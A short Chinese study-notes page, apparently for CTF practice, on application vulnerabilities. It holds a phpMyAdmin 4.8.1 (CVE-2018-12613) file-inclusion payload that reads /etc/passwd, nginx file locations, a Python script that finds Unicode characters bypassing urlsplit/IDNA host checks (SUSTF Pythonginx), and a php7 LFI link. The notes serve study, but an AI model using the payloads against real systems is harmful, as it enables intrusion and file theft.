不同应用的漏洞

[TOC]



# phpmyadmin4.8.1

cve-2018-12613-PhpMyadmin后台文件包含

payload:

```undefined
target=db_datadict.php%253f/../../../../../../../../etc/passwd
```

[cve-2018-12613-PhpMyadmin后台文件包含 - 简书 (jianshu.com)](https://www.jianshu.com/p/fb9c2ae16d09)

[【首发】phpmyadmin4.8.1后台getshell (qq.com)](https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd)



##### NGINX,nginx

配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf

[[SUCTF 2019\]Pythonginx_pythonginx urlsplit-CSDN博客](https://blog.csdn.net/m0_53314778/article/details/113730543)

**urlsplit**

这个是ngnix的一个漏洞，

```
CVE-2019-9636：urlsplit 不处理 NFKC 标准化
CVE-2019-10160：urlsplit NFKD 标准化漏洞

漏洞原理：
用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 	URL。
例如，在直接比较中，\ uFF03不等于'＃'，而是统一化为'＃'，这会更改 URL 的片段部分。类似地，\ u2100 统一化为'a/c'，它引入了路径段。

```

脚本

```
from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url="http://suctf.c{}".format(uni)
        try:
            if getUrl(url):
                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
        except:
            pass
 
def getUrl(url):
    url=url
    host=parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts=list(urlsplit(url))
    host=parts[1]
    if host == 'suctf.cc':
        return False
    newhost=[]
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1]='.'.join(newhost)
    finalUrl=urlunsplit(parts).split(' ')[0]
    host=parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False
 
 
if __name__=='__main__':
    get_unicode()


```

###### php7 LFI

[--------已搬运--------[NPUCTF2020\]ezinclude - 文件包含 --- php7 漏洞 --。string.strip_tags SegmentFault_php漏洞 php://filter/string.strip_tags/resource=/etc-CSDN博客](https://blog.csdn.net/Zero_Adam/article/details/115271448?ops_request_misc=%7B%22request%5Fid%22%3A%22170894971216777224429249%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=170894971216777224429249&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-115271448-null-null.142^v99^pc_search_result_base1&utm_term=[NPUCTF2020]ezinclude&spm=1018.2226.3001.4187)

